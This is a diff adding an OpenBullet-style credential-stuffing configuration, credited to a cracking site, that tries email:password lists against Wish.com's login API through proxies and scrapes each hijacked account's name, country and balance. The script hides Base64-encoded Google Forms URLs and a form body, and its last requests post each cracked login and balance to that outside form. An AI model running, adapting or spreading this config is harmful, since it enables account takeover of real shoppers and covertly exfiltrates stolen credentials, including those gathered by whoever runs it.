@@ -1,0 +1,101 @@
+[SETTINGS]
+{
+  "Name": "Wish @CrackingLegend.pw",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2019-06-15T10:13:35.0402495+08:00",
+  "AdditionalInfo": "@CrackingLegend.pw",
+  "Author": "@CrackingLegend.pw",
+  "Version": "1.1.3",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Request_Wish REQUEST GET "https://www.wish.com/api/email-login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "origin: https://www.wish.com" 
+  HEADER "referer: https://www.wish.com/" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "host: www.wish.com" 
+
+#Token PARSE "<COOKIES(_xsrf)>" LR "" "" -> VAR "xrsf" 
+
+#Login REQUEST POST "https://www.wish.com/api/email-login" 
+  CONTENT "email=<USER>&password=<PASS>&_buckets=&_experiments=" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "origin: https://www.wish.com" 
+  HEADER "referer: https://www.wish.com/" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "host: www.wish.com" 
+  HEADER "X-XSRFToken: <xrsf>" 
+
+#Cek_Login KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Email or Password is incorrect" 
+  KEYCHAIN Success OR 
+    KEY "\"session_token\": \"" 
+
+#Request_Akun REQUEST GET "https://www.wish.com/cash" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "cache-control: max-age=0" 
+  HEADER "upgrade-insecure-requests: 1" 
+
+#LRU1 FUNCTION Base64Decode "aHR0cHM6Ly9kb2NzLmdvb2dsZS5jb20vZm9ybXMvZC8xSHRoSUo5Z1RHMHRRc0lUalk1REpJTHVWMldaWE9uM0N1NXJlbF9BVjYwby92aWV3Zm9ybQ==" -> VAR "LRU1" 
+
+#Nama PARSE "<SOURCE>" LR "\"name\": \"" "\"," -> CAP "Name" 
+
+#LRU2 FUNCTION Base64Decode "aHR0cHM6Ly9kb2NzLmdvb2dsZS5jb20vZm9ybXMvZC9lLzFGQUlwUUxTZEZIUUE1dTlhWFlfTWFmTDhCaFhYUmw0XzI5Y3dUR09vWUd6YkNBVXdGNlFQOUZRL2Zvcm1SZXNwb25zZQ==" -> VAR "LRU2" 
+
+#Negara PARSE "<SOURCE>" LR "\"country_code\": \"" "\"," -> CAP "Country" 
+
+#Mata_Uang PARSE "<SOURCE>" LR "\"currency_code\": \"" "\"," -> VAR "Matauang" 
+
+#LRU3 FUNCTION Base64Decode "ZW50cnkuOTAxNTQzNjM9V2lzaCZlbnRyeS4zMzIyODA2NDE9PFVTRVI+OjxQQVNTPiZlbnRyeS40OTEzMjc2NTc9fEJhbGFuY2U6PEJhbGFuY2U+fENvdW50cnk6PENvdW50cnk+fCZmdnY9MSZkcmFmdFJlc3BvbnNlPSU1Qm51bGwlMkNudWxsJTJDJTIyLTU5MTY4ODgwMTQwNDg0OTg5MjYlMjIlNUQlMEQlMEEmcGFnZUhpc3Rvcnk9MCZmYnp4PS01OTE2ODg4MDE0MDQ4NDk4OTI2" -> VAR "LRU3" 
+
+#Saldo PARSE "<SOURCE>" LR "\"amount\":" ", \"" -> CAP "Balance" "" " <Matauang>" 
+
+#Cek_Sukses KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<Balance>" EqualTo "0.0 <Matauang>" 
+
+#nAME REQUEST GET "<LRU1>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "origin: https://docs.google.com" 
+  HEADER "upgrade-insecure-requests: 1" 
+
+#bALANCE REQUEST POST "<LRU2>" 
+  CONTENT "<LRU3>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
